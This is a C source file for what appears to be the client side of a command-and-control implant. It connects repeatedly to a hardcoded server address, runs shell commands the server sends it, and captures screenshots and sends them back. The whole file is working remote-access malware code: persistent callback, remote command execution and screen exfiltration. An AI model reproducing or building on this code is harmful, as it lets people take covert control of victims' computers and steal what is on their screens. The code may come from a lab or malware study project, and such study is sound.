#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "c2.h"
#include "client/client_psh.h"
#include "client/screenshot.h"
#include "common.h"

#define SERVER_IP "192.168.100.100"

int main() {
    SOCK_INIT();

    // Create a TCP socket descriptor.
    sock_t sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv = {0};

    // Config
    serv.sin_family = AF_INET;
    serv.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, SERVER_IP, &serv.sin_addr);

    // Attempt to connect to c2server
    while (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
        sleep(3);
    }

    // Main loop
    while (1) {
        char cmd;

        // Getting initial command
        if (safe_recv(sock, &cmd, 1, 0) <= 0) {
            sleep(3);
            continue; 
        }

        if (cmd == '1') {
            // Receive and exec command
            psh_receive(sock);
        } else if (cmd == '2') {
            // Take screenshot and send raw file to server
            size_t size = 0;
            BYTE* buffer = SaveScreenshot(&size);
            if (!buffer || size == 0) {
                printf("[ERR] Taking screenshot failed.\n");
                continue;
            }

            safe_send_payload(sock, buffer, size, 0);
        } 
    }

    CLOSE_SOCK(sock);
    SHUT_DOWN();
    return 0;
}